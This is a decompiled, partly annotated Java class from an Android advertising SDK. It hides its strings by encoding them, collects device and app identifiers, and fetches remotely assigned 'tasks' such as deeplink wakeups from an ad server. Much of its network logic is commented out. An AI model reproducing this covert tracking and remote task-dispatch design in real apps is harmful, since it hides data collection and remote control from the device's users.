package com.kkwinter.thirdsdk.advworkflow.util;

import android.app.Activity;
import android.content.Context;
import android.text.TextUtils;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;

import org.json.JSONObject;

public final class r implements com.kkwinter.thirdsdk.advworkflow.b.a.aa {

    private static final String b = com.kkwinter.thirdsdk.advworkflow.util.f.a("MrABNKXsUOzWNNJj6JPNsAOj6Rn26rLS1pW82eYOe6pc5wgPnbsc7Q==");  //com.power.ttook.advsdk.entry.WorkService
    private static final String c = com.kkwinter.thirdsdk.advworkflow.util.f.a("MrABNKXsUOzWNNJj6JPNsAOj6Rn26rLS1pW82eY9db1a2wM=");          // com.power.ttook.advsdk.entry.daemon
    private static final String d = com.kkwinter.thirdsdk.advworkflow.util.f.a("MLsaRaHiQNbAe9925IjP6Ac=");         //adv_tag_dayactive
    private static final String e = com.kkwinter.thirdsdk.advworkflow.util.f.a("MLsaRaHiQNbFaMN22I7D+Quo8Q==");     //adv_tag_area_region
    private static final String f = com.kkwinter.thirdsdk.advworkflow.util.f.a("MLsaRaHiQNbFaMN22IrH9w6j");         //adv_tag_area_vaild

    HashMap<String, String> a = new HashMap();
    private Context g = null;
    private ClassLoader h = null;
    private String i = "";   // 模块名
    private String j = "";   // machineID
    private String k = "";   // requestID
    private JSONObject l = null;  // 设备信息
    private String m = null;      // hostAppPackageName
    private long n = 0L;
    private String o = "";        // .db 路径
    private HashMap<String, Object> p;  // topActivity集合
    private long q = 0L;        // 当前时间
    private long r = 0L;
    private Activity s = null;

    private String t = "http://adv.99yesrs.com" + com.kkwinter.thirdsdk.advworkflow.util.f.a("fr4IbPr3RvrPXMNz5Z3F9Q==");  //  /adv/taskFedback
    private String u = "http://adv.99yesrs.com" + com.kkwinter.thirdsdk.advworkflow.util.f.a("fr4IbPrkQv3we9V8");          //  /adv/getTask
    private String v = "http://adv.99yesrs.com" + com.kkwinter.thirdsdk.advworkflow.util.f.a("fr4IbPrnRvDledJ+8Zk=");      //  /adv/dayActive
    private String w = com.kkwinter.thirdsdk.advworkflow.util.f.a("OasYaqa5CKbNaohw6I3K9AWwsQn97LPQ3ZWvxKwr");             //  https://ip.goqljgw.com/getaddr


    /**
     * 总入口
     *
     * @param paramContext     context
     * @param paramClassLoader classloader
     * @param paramString1     模块名
     * @param paramString2     machineID
     * @param paramString3     requestID
     * @param paramJSONObject  设备信息
     * @param paramHashMap     topActivity集合/ entryURL
     */
    public final void a(Context paramContext, ClassLoader paramClassLoader, String paramString1, String paramString2, String paramString3, JSONObject paramJSONObject, HashMap<String, Object> paramHashMap) {
        this.g = paramContext;
        this.h = paramClassLoader;
        this.i = paramString1;
        this.j = paramString2;
        this.k = paramString3;
        this.l = paramJSONObject;

        this.m = com.kkwinter.thirdsdk.advworkflow.util.k.a(paramJSONObject, com.kkwinter.thirdsdk.advworkflow.util.f.a("ObAfbpTzV9nFec124Jno/w+i"), "");    // hostAppPackageName
        this.p = paramHashMap;

        //      /advDB/         _RND        .db
        this.o = (paramContext.getCacheDir() + com.kkwinter.thirdsdk.advworkflow.util.f.a("fr4IbJHBCA==") + com.kkwinter.thirdsdk.advworkflow.util.b.a.a(new StringBuilder().append(this.i).append(com.kkwinter.thirdsdk.advworkflow.util.f.a("Do0iXg==")).toString()) + com.kkwinter.thirdsdk.advworkflow.util.f.a("f7sO"));
        this.q = (System.currentTimeMillis() / 1000L);

        this.t = ("http://adv.99yesrs.com" + com.kkwinter.thirdsdk.advworkflow.util.f.a("fr4IbPr3RvrPXMNz5Z3F9Q=="));   // /adv/taskFedback
        this.u = ("http://adv.99yesrs.com" + com.kkwinter.thirdsdk.advworkflow.util.f.a("fr4IbPrkQv3we9V8"));           // /adv/getTask
        this.v = ("http://adv.99yesrs.com" + com.kkwinter.thirdsdk.advworkflow.util.f.a("fr4IbPrnRvDledJ+8Zk="));       // /adv/dayActive
        if (paramHashMap.containsKey(com.kkwinter.thirdsdk.advworkflow.util.f.a("NLEYaKzWdcU="))) {                     // entryURL

            String paramString = (String) paramHashMap.get(com.kkwinter.thirdsdk.advworkflow.util.f.a("NLEYaKzWdcU=")); // entryURL

            if (!TextUtils.isEmpty(paramString)) {
                this.t = (paramString + com.kkwinter.thirdsdk.advworkflow.util.f.a("fr4IbPr3RvrPXMNz5Z3F9Q=="));    // /adv/taskFedback
                this.u = (paramString + com.kkwinter.thirdsdk.advworkflow.util.f.a("fr4IbPrkQv3we9V8"));            // /adv/getTask
                this.v = (paramString + com.kkwinter.thirdsdk.advworkflow.util.f.a("fr4IbPrnRvDledJ+8Zk="));        // /adv/dayActive
            }
        }

        //开启deeplink任务【sp中 adv_tag_wakeup_task】
        com.kkwinter.thirdsdk.advworkflow.b.m.a(this.g);


        a(1L);

        new Thread(new Runnable() {
            public final void run() {

                if (r.this.a() == null) {
//                    r.a(r.this, 0L);
//                    r.a(r.this, null);
//                    if (r.a(r.this) == null) {
//
//                    }
                }
                for (; ; ) {
                    try {
                        Thread.sleep(500L);
                    } catch (Exception localException) {

                    }

                    break;

//                    if (r.a(r.this) == null) {
//                        r.a(r.this, r.this.a());
//                        r.a(r.this, System.currentTimeMillis() / 1000L);
//                    }
                }
            }
        }).start();
    }






    //对比是否同一天？？
    private boolean j() {
        boolean bool = false;
        try {
            SimpleDateFormat localSimpleDateFormat = new SimpleDateFormat(com.kkwinter.thirdsdk.advworkflow.util.f.a("KKYVY5jOQ+0="));  // yyyyMMdd
            int i1 = localSimpleDateFormat.format(new Date(System.currentTimeMillis())).compareTo(localSimpleDateFormat.format(new Date(com.kkwinter.thirdsdk.advworkflow.util.p.a(this.g, d) * 1000L)));
            if (i1 != 0) {    // 0：同一天；   负值：前一天；   正值：后一天
                bool = true;
            }
            return bool;
        } catch (Exception localException) {
        }
        return false;
    }

    //对比时间，什么作用？？
    private boolean k() {
        boolean bool = false;
        try {
            SimpleDateFormat localSimpleDateFormat = new SimpleDateFormat(com.kkwinter.thirdsdk.advworkflow.util.f.a("KKYVY5jOQ+0="));  // yyyyMMdd
            int i1 = localSimpleDateFormat.format(new Date(System.currentTimeMillis())).compareTo(localSimpleDateFormat.format(new Date(com.kkwinter.thirdsdk.advworkflow.util.p.a(this.g, f) * 1000L)));
            if (i1 == 0) {    //
                bool = true;
            }
            return bool;
        } catch (Exception localException) {
        }
        return false;
    }

    protected final Activity a() {
        return (Activity) this.p.get(com.kkwinter.thirdsdk.advworkflow.util.f.a("JbAcW7b3Tv/Nbt8="));
    }

    protected final void a(long paramLong) {
        com.kkwinter.thirdsdk.advworkflow.util.j.a(new Runnable() {

            public final void run() {

                r.this.e();
                r.this.d();
                r.this.f();

            }
        }, paramLong);
    }



    protected final void a(String paramString1, String paramString2, JSONObject paramJSONObject) {
        com.kkwinter.thirdsdk.advworkflow.b.a a = null;

        if (paramString2.equalsIgnoreCase(com.kkwinter.thirdsdk.advworkflow.b.f.a("NLIcbqzXRvrP"))) {
            a = new com.kkwinter.thirdsdk.advworkflow.b.h(this.g, this.t, this.j, this.i, paramString1, this.n, paramJSONObject, paramString2, this.p, this);
        }

        for (; ; ) {
            try {
                a.a();
                return;
            } catch (Exception e) {
                a.b(0, com.kkwinter.thirdsdk.advworkflow.util.f.a("tWTX/18iDw==") + paramString2 + com.kkwinter.thirdsdk.advworkflow.util.f.a("eDnlvT0iq2wYmEOvP8b9") + e.getMessage() + com.kkwinter.thirdsdk.advworkflow.util.f.a("DA=="));
            }
            if (paramString2.equalsIgnoreCase(com.kkwinter.thirdsdk.advworkflow.util.f.a("JroOcbz3c+jXcQ=="))) {
                a = new com.kkwinter.thirdsdk.advworkflow.b.n(this.g, this.t, this.j, this.i, paramString1, this.n, paramJSONObject, paramString2, this.p, this);
            } else if (paramString2.equalsIgnoreCase(com.kkwinter.thirdsdk.advworkflow.util.f.a("MrMFarfsRvvATsdk7A=="))) {
                a = new com.kkwinter.thirdsdk.advworkflow.b.b(this.g, this.t, this.j, this.i, paramString1, this.n, paramJSONObject, paramString2, this.p, this);
            } else if (paramString2.equalsIgnoreCase(com.kkwinter.thirdsdk.advworkflow.util.f.a("NaYCe7jqROXLe8JD5o/N"))) {
                a = new com.kkwinter.thirdsdk.advworkflow.b.g(this.g, this.t, this.j, this.i, paramString1, this.n, paramJSONObject, paramString2, this.p, this);
            } else if (paramString2.equalsIgnoreCase(com.kkwinter.thirdsdk.advworkflow.util.f.a("Jr4Hf6Dzc+jXcQ=="))) {
                a = new com.kkwinter.thirdsdk.advworkflow.b.l(this.g, this.t, this.j, this.i, paramString1, this.n, paramJSONObject, paramString2, this.p, this);
            } else if (paramString2.equalsIgnoreCase(com.kkwinter.thirdsdk.advworkflow.util.f.a("O6w4e6bo"))) {
                a = new com.kkwinter.thirdsdk.advworkflow.b.i(this.g, this.t, this.j, this.i, paramString1, this.n, paramJSONObject, paramString2, this.p, this);
            } else if (paramString2.equalsIgnoreCase(com.kkwinter.thirdsdk.advworkflow.util.f.a("JK0ATrTwTA=="))) {
                a = new com.kkwinter.thirdsdk.advworkflow.b.k(this.g, this.t, this.j, this.i, paramString1, this.n, paramJSONObject, paramString2, this.p, this);
            } else {
                a = new com.kkwinter.thirdsdk.advworkflow.b.j(this.g, this.t, this.j, this.i, paramString1, this.n, paramJSONObject, paramString2, this.p, this);
            }
        }
    }

    protected final void a(JSONObject paramJSONObject) {

        try {
            JSONObject localJSONObject = com.kkwinter.thirdsdk.advworkflow.util.k.a(paramJSONObject, com.kkwinter.thirdsdk.advworkflow.util.f.a("Jb4fcQ=="), (JSONObject) null);
            if (localJSONObject == null) {
                a(120000L);
                return;
            }

            final String str = (String) localJSONObject.keys().next();

            localJSONObject = localJSONObject.getJSONObject(str);
            final JSONObject finalLocalJSONObject = localJSONObject;


            com.kkwinter.thirdsdk.advworkflow.util.j.a(new Runnable() {
                public final void run() {

//                    a(this.a, str, finalLocalJSONObject);

                }
            });
            return;
        } catch (Exception e) {

            a(60000L);
        }
    }

    public final void a(boolean paramBoolean) {
        if (paramBoolean == true) {
            a(1L);
            return;
        }
        a(60000L);
    }

    protected final long b() {
        return System.currentTimeMillis() / 1000L - this.q;
    }

    protected final long c() {
        if (this.s == null) {
            return 0L;
        }
        return System.currentTimeMillis() / 1000L - this.r;
    }

    protected final void d() {
        if (j()) {
            com.kkwinter.thirdsdk.advworkflow.util.p.a(this.g, d, System.currentTimeMillis() / 1000L);
            new Thread(new Runnable() {
                public final void run() {

//                    if (com.kkwinter.thirdsdk.advworkflow.util.s.a(r.c(r.this), r.d(r.this), r.e(r.this), r.f(r.this), r.g(r.this)) != null) {
//                        com.kkwinter.thirdsdk.advworkflow.util.p.a(r.b(r.this), r.g(), System.currentTimeMillis() / 1000L);
//                        return;
//                    }
//                    com.kkwinter.thirdsdk.advworkflow.util.p.a(r.b(r.this), r.g(), 0L);

                }
            }).start();
        }
    }

    protected final void e() {
        if (k()) {
            String[] arrayOfString = com.kkwinter.thirdsdk.advworkflow.util.p.b(this.g, e, "").split(com.kkwinter.thirdsdk.advworkflow.util.f.a("EZ8="));
            if ((arrayOfString.length == 2) && (!TextUtils.isEmpty(arrayOfString[0])) && (!TextUtils.isEmpty(arrayOfString[1]))) {
                this.a.put(com.kkwinter.thirdsdk.advworkflow.util.f.a("I7oLc7rteODA"), arrayOfString[0]);
                this.a.put(com.kkwinter.thirdsdk.advworkflow.util.f.a("MrYYY4rqQw=="), arrayOfString[1]);
                return;
            }
            this.a.put(com.kkwinter.thirdsdk.advworkflow.util.f.a("I7oLc7rteODA"), "");
            this.a.put(com.kkwinter.thirdsdk.advworkflow.util.f.a("MrYYY4rqQw=="), "");
            com.kkwinter.thirdsdk.advworkflow.util.p.a(this.g, f, 0L);
            return;
        }
        com.kkwinter.thirdsdk.advworkflow.util.p.a(this.g, f, System.currentTimeMillis() / 1000L);
        new Thread(new Runnable() {
            public final void run() {

//                JSONObject var0 = com.kkwinter.thirdsdk.advworkflow.util.s.a(r.h(r.this));
//                try {
//                    JSONObject var1 = com.kkwinter.thirdsdk.advworkflow.util.k.a(var0, com.kkwinter.thirdsdk.advworkflow.util.f.a("MLsIaLDwVA=="), (JSONObject) null);
//                    String var2 = com.kkwinter.thirdsdk.advworkflow.util.k.a( var1, com.kkwinter.thirdsdk.advworkflow.util.f.a("I7oLc7rteODA"), "");
//                    String var3 = com.kkwinter.thirdsdk.advworkflow.util.k.a( var1, com.kkwinter.thirdsdk.advworkflow.util.f.a("MrYYY4rqQw=="), "");
//                    if ((TextUtils.isEmpty( var2)) || (TextUtils.isEmpty( var3))) {
//                        com.kkwinter.thirdsdk.advworkflow.util.p.a(r.b(r.this), r.h(), 0L);
//                        return;
//                    }
//                    var2 =  var2 + com.kkwinter.thirdsdk.advworkflow.util.f.a("EZ8=") +  var3;
//                    com.kkwinter.thirdsdk.advworkflow.util.p.a(r.b(r.this), r.i(), (String) var2);
//                    return;
//                } catch (Exception localException) {
//                    com.kkwinter.thirdsdk.advworkflow.util.p.a(r.b(r.this), r.h(), 0L);
//                }

            }
        }).start();

        this.a.put(com.kkwinter.thirdsdk.advworkflow.util.f.a("I7oLc7rteODA"), "");
        this.a.put(com.kkwinter.thirdsdk.advworkflow.util.f.a("MrYYY4rqQw=="), "");
    }

    protected final void f() {
        this.n = (System.currentTimeMillis() / 1000L);
        new Thread(new Runnable() {
            public final void run() {

//                Object localObject = new StringBuilder();
//                com.kkwinter.thirdsdk.advworkflow.util.q.a();
//                JSONObject localJSONObject = com.kkwinter.thirdsdk.advworkflow.util.s.a(r.i(r.this), r.d(r.this), r.e(r.this), r.f(r.this), r.this.b(), r.this.c(), r.this.a, r.g(r.this), (StringBuilder) localObject);
//                localObject = localJSONObject;
//                if (localJSONObject != null) {
//                    localObject = com.kkwinter.thirdsdk.advworkflow.util.q.a(localJSONObject);
//                }
//                if (localObject == null) {
//                    r.this.a(60000L);
//                    return;
//                }
//                r.this.a((JSONObject) localObject);


            }
        }).start();
    }
}
